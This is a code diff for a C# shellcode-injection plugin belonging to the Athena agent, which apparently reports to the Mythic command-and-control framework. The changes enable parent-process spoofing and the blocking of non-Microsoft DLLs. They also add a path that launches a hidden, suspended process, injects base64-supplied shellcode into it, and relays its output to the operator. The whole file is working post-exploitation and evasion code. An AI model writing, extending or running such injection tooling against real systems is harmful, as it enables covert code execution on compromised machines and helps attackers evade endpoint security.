@@ -6,6 +6,8 @@ using System.Runtime.InteropServices;
 using shellcode_inject;
 using System.Diagnostics;
 using Athena.Commands;
+using static shellcode_inject.Native;
+using System.Reflection.Metadata.Ecma335;
 
 namespace Plugins
 {
@@ -40,38 +42,52 @@ namespace Plugins
             {
                 bool spoofParent = false;
                 bool blockDlls = false;
+                bool output = false;
                 int parent = 0;
 
                 byte[] b = Misc.Base64DecodeToByteArray(args["asm"]);
 
-                //if (!string.IsNullOrEmpty(args["parent"]))
-                //{
-                //    if (int.TryParse(args["parent"], out parent))
-                //    {
-                //        spoofParent = true;
-                //    }
-                //}
+                if (!string.IsNullOrEmpty(args["parent"]))
+                {
+                    if (int.TryParse(args["parent"], out parent))
+                    {
+                        spoofParent = true;
+                    }
+                }
 
-                //if (bool.Parse(args["blockdlls"]))
-                //{
-                //    blockDlls = true;
-                //}
+                if (bool.Parse(args["blockDlls"]))
+                {
+                    blockDlls = true;
+                }
 
-                InjectNewProcess(args["processName"], spoofParent, blockDlls, parent, technique, b, args["task-id"]);
+                if (bool.Parse(args["output"]))
+                {
+                    InjectNewProcessWithOutput(args["processName"], spoofParent, blockDlls, parent, technique, b, args["task-id"], output);
+                }
+                else
+                {
+                    InjectNewProcess(args["processName"], spoofParent, blockDlls, parent, technique, b, args["task-id"], output);
+                }
+
+                
             }
         }
-        static bool InjectNewProcess(string processName, bool spoofParent, bool blockDlls, int parentProcessId, ITechnique method, byte[] sc, string task_id)
+        static bool InjectNewProcessWithOutput(string processName, bool spoofParent, bool blockDlls, int parentProcessId, ITechnique method, byte[] sc, string task_id, bool output)
         {
             //Credit for a lot of this code goes to #leoloobeek
             //https://github.com/leoloobeek/csharp/blob/master/ExecutionTesting.cs
+            ManualResetEvent mre = new ManualResetEvent(false);
+            var saHandles = new Native.SECURITY_ATTRIBUTES()
+            {
+                nLength = Marshal.SizeOf(new Native.SECURITY_ATTRIBUTES()),
+                bInheritHandle = true,
+                lpSecurityDescriptor = IntPtr.Zero
 
-            var saHandles = new Native.SECURITY_ATTRIBUTES();
-            saHandles.nLength = Marshal.SizeOf(saHandles);
-            saHandles.bInheritHandle = true;
-            saHandles.lpSecurityDescriptor = IntPtr.Zero;
+            };
 
             IntPtr hStdOutRead;
             IntPtr hStdOutWrite;
+
             // Duplicate handle created just in case
             IntPtr hDupStdOutWrite = IntPtr.Zero;
 
@@ -92,25 +108,27 @@ namespace Plugins
 
             var lpSize = IntPtr.Zero;
             var success = Native.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
-            if (success || lpSize == IntPtr.Zero)
+
+            if (success || lpSize == IntPtr.Zero) //Successfully initialized ProcThreadAttributeList
             {
                 return false;
             }
 
             siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
             success = Native.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
+
             if (!success)
             {
                 TaskResponseHandler.WriteLine($"Error: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
                 return false;
             }
 
-            if (blockDlls)
+            if (blockDlls) // Block DLLs that aren't signed by Microsoft
             {
                 AddBlockDLLs(ref siEx, ref lpSize);
             }
 
-            if (spoofParent)
+            if (spoofParent) // Spoof the parent process
             {
                 AddSpoofParent(parentProcessId, ref siEx, ref lpValueProc, ref hStdOutWrite, ref hDupStdOutWrite);
 
@@ -134,8 +152,89 @@ namespace Plugins
             TaskResponseHandler.WriteLine($"Process Started with ID: {pInfo.dwProcessId}", task_id, false);
 
             method.Inject(sc, pInfo.hProcess);
-
             GetProcessOutput(lpValueProc, hStdOutRead, pInfo, siEx, task_id);
+            
+            CleanUp(lpValueProc, hStdOutRead, pInfo, siEx);
+
+            return pInfo.hProcess != IntPtr.Zero;
+        }
+
+
+        static bool InjectNewProcess(string processName, bool spoofParent, bool blockDlls, int parentProcessId, ITechnique method, byte[] sc, string task_id, bool output)
+        {
+            //Credit for a lot of this code goes to #leoloobeek
+            //https://github.com/leoloobeek/csharp/blob/master/ExecutionTesting.cs
+            ManualResetEvent mre = new ManualResetEvent(false);
+            var saHandles = new Native.SECURITY_ATTRIBUTES()
+            {
+                nLength = Marshal.SizeOf(new Native.SECURITY_ATTRIBUTES()),
+                bInheritHandle = true,
+                lpSecurityDescriptor = IntPtr.Zero
+
+            };
+
+            // Duplicate handle created just in case
+            IntPtr hDupStdOutWrite = IntPtr.Zero;
+
+            var pInfo = new Native.PROCESS_INFORMATION();
+            var siEx = new Native.STARTUPINFOEX();
+
+            // Be sure to set the cb member of the STARTUPINFO structure to sizeof(STARTUPINFOEX).
+            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
+            IntPtr lpValueProc = IntPtr.Zero;
+
+            var lpSize = IntPtr.Zero;
+            var success = Native.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
+            
+            if (success || lpSize == IntPtr.Zero) //Successfully initialized ProcThreadAttributeList
+            {
+                return false;
+            }
+
+            siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+            success = Native.InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
+
+            if (!success)
+            {
+                TaskResponseHandler.WriteLine($"Error: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
+                return false;
+            }
+
+            if (blockDlls) // Block DLLs that aren't signed by Microsoft
+            {
+                AddBlockDLLs(ref siEx, ref lpSize);
+            }
+
+            IntPtr tempHandle = IntPtr.Zero;
+
+            if (spoofParent) // Spoof the parent process
+            {
+                AddSpoofParent(parentProcessId, ref siEx, ref lpValueProc, ref tempHandle, ref hDupStdOutWrite);
+
+            }
+
+            siEx.StartupInfo.dwFlags = Native.STARTF_USESHOWWINDOW | Native.STARTF_USESTDHANDLES;
+            siEx.StartupInfo.wShowWindow = Native.SW_HIDE;
+
+            var ps = new Native.SECURITY_ATTRIBUTES();
+            var ts = new Native.SECURITY_ATTRIBUTES();
+            ps.nLength = Marshal.SizeOf(ps);
+            ts.nLength = Marshal.SizeOf(ts);
+
+            bool ret = Native.CreateProcess(null, processName, ref ps, ref ts, true, Native.EXTENDED_STARTUPINFO_PRESENT | Native.CREATE_NO_WINDOW | Native.CREATE_SUSPENDED, IntPtr.Zero, null, ref siEx, out pInfo);
+            if (!ret)
+            {
+                TaskResponseHandler.WriteLine($"Failed to start: {Marshal.GetLastPInvokeError()}", task_id, true, "error");
+                return false;
+            }
+
+            TaskResponseHandler.WriteLine($"Process Started with ID: {pInfo.dwProcessId}", task_id, false);
+
+            method.Inject(sc, pInfo.hProcess);
+            
+            Native.WaitForSingleObject(pInfo.hProcess, INFINITE);
+            
+            CleanUp(lpValueProc, tempHandle, pInfo, siEx);
 
             return pInfo.hProcess != IntPtr.Zero;
         }
@@ -155,6 +254,7 @@ namespace Plugins
                 (IntPtr)IntPtr.Size,
                 IntPtr.Zero,
                 IntPtr.Zero);
+
             if (!success)
             {
                 return false;
@@ -165,8 +265,10 @@ namespace Plugins
         {
             //Get a handle to the parent process
             IntPtr parentHandle = Native.OpenProcess(Native.ProcessAccessFlags.CreateProcess | Native.ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
+
             // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
             lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
+
             Marshal.WriteIntPtr(lpValueProc, parentHandle);
 
             //Updates the parent process ID
@@ -184,7 +286,7 @@ namespace Plugins
                 return false;
             }
 
-            IntPtr hCurrent = System.Diagnostics.Process.GetCurrentProcess().Handle;
+            IntPtr hCurrent = Process.GetCurrentProcess().Handle;
             IntPtr hNewParent = Native.OpenProcess(Native.ProcessAccessFlags.DuplicateHandle, true, parentProcessId);
 
             success = Native.DuplicateHandle(hCurrent, hStdOutWrite, hNewParent, ref hDupStdOutWrite, 0, true, Native.DUPLICATE_CLOSE_SOURCE | Native.DUPLICATE_SAME_ACCESS);
@@ -202,90 +304,95 @@ namespace Plugins
         }
         static bool GetProcessOutput(IntPtr lpValueProc, IntPtr hStdOutRead, Native.PROCESS_INFORMATION pInfo, Native.STARTUPINFOEX siEx, string task_id)
         {
-            try
+            CancellationTokenSource cts = new CancellationTokenSource();
+            CancellationToken ct = cts.Token;
+            SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false);
+            var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), true);
+
+            while (!ct.IsCancellationRequested) //Loop to handle process output
             {
-                SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false);
-                var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), true);
-                bool exit = false;
-                try
+                if (Native.WaitForSingleObject(pInfo.hProcess, 100) == 0) //If the process closed, tell the loop to stop
                 {
-                    do
+                    cts.Cancel();
+                }
+
+                char[] buf;
+                int bytesRead;
+                uint bytesToRead = 0;
+
+                if(Native.PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero)) //Check if we have bytes to read
+                {
+                    if(bytesToRead == 0) //We don't have any bytes to read
                     {
-                        if (Native.WaitForSingleObject(pInfo.hProcess, 100) == 0)
+                        if (ct.IsCancellationRequested) //Check if we're supposed to exit
                         {
-                            exit = true;
+                            TaskResponseHandler.WriteLine("Finished.", task_id, true);
+                            break;
                         }
-
-                        char[] buf = null;
-                        int bytesRead;
-
-                        uint bytesToRead = 0;
-
-                        bool peekRet = Native.PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero);
-
-                        if (peekRet == true && bytesToRead == 0)
+                        else //Process just hasn't written anything yet
                         {
-                            if (exit == true)
-                            {
-                                TaskResponseHandler.WriteLine("Finished.", task_id, true);
-                                break;
-                            }
-                            else
-                            {
-                                continue;
-                            }
+                            continue;
                         }
+                    }
+                    else if(bytesToRead > 4096) //We limit our buffer size to 4096 to not overwhelm the agent
+                    {
+                        bytesToRead = 4096;
+                    }
 
-                        if (bytesToRead > 4096)
-                            bytesToRead = 4096;
+                    buf = new char[bytesToRead]; //Allocate our new char buffer
 
-                        buf = new char[bytesToRead];
-                        bytesRead = reader.Read(buf, 0, buf.Length);
-                        if (bytesRead > 0)
+                    try
+                    {
+                        bytesRead = reader.Read(buf, 0, buf.Length); //Read the char buffer into our previously allocated array
+
+                        if (bytesRead > 0) //We read some bytes, lets return it to Mythic
                         {
-                            Debug.WriteLine($"[{DateTime.Now}] Reading {bytesRead} from sacrificial process.");
+                            Console.WriteLine(new string(buf));
                             TaskResponseHandler.Write(new string(buf), task_id, false);
                         }
-
-                    } while (true);
-                    Debug.WriteLine($"[{DateTime.Now}] Closing reader.");
-                    reader.Close();
-                }
-                finally
-                {
-                    if (!safeHandle.IsClosed)
+                    }
+                    catch
                     {
-                        safeHandle.Close();
+                        //nadda
                     }
                 }
-
-                if (hStdOutRead != IntPtr.Zero)
-                {
-                    Native.CloseHandle(hStdOutRead);
-                }
             }
-            finally
+
+            //Cancellation was requested, time for cleanup
+            reader.Close(); //Close the allocated StreamReader
+
+            if (!safeHandle.IsClosed) //Check if our handle is still open, if it is close it
             {
-                // Free the attribute list
-                if (siEx.lpAttributeList != IntPtr.Zero)
-                {
-                    Native.DeleteProcThreadAttributeList(siEx.lpAttributeList);
-                    Marshal.FreeHGlobal(siEx.lpAttributeList);
-                }
-                Marshal.FreeHGlobal(lpValueProc);
-
-                // Close process and thread handles
-                if (pInfo.hProcess != IntPtr.Zero)
-                {
-                    Native.TerminateProcess(pInfo.hProcess, 0);
-                    Native.CloseHandle(pInfo.hProcess);
-                }
-                if (pInfo.hThread != IntPtr.Zero)
-                {
-                    Native.CloseHandle(pInfo.hThread);
-                }
+                safeHandle.Close();
             }
+
+            if (hStdOutRead != IntPtr.Zero) //Close our allocated stdout handle if it exists
+            {
+                Native.CloseHandle(hStdOutRead);
+            }
+
             return true;
+        }
+        static void CleanUp(IntPtr lpValueProc, IntPtr hStdOutRead, Native.PROCESS_INFORMATION pInfo, Native.STARTUPINFOEX siEx)
+        {
+            if (siEx.lpAttributeList != IntPtr.Zero) //Close our allocated attributes list
+            {
+                Native.DeleteProcThreadAttributeList(siEx.lpAttributeList);
+                Marshal.FreeHGlobal(siEx.lpAttributeList);
+            }
+
+            Marshal.FreeHGlobal(lpValueProc);
+
+            if (pInfo.hProcess != IntPtr.Zero) //Close process and thread handles
+            {
+                //Native.TerminateProcess(pInfo.hProcess, 0);
+                Native.CloseHandle(pInfo.hProcess);
+            }
+
+            if (pInfo.hThread != IntPtr.Zero)
+            {
+                Native.CloseHandle(pInfo.hThread);
+            }
         }
     }
 }
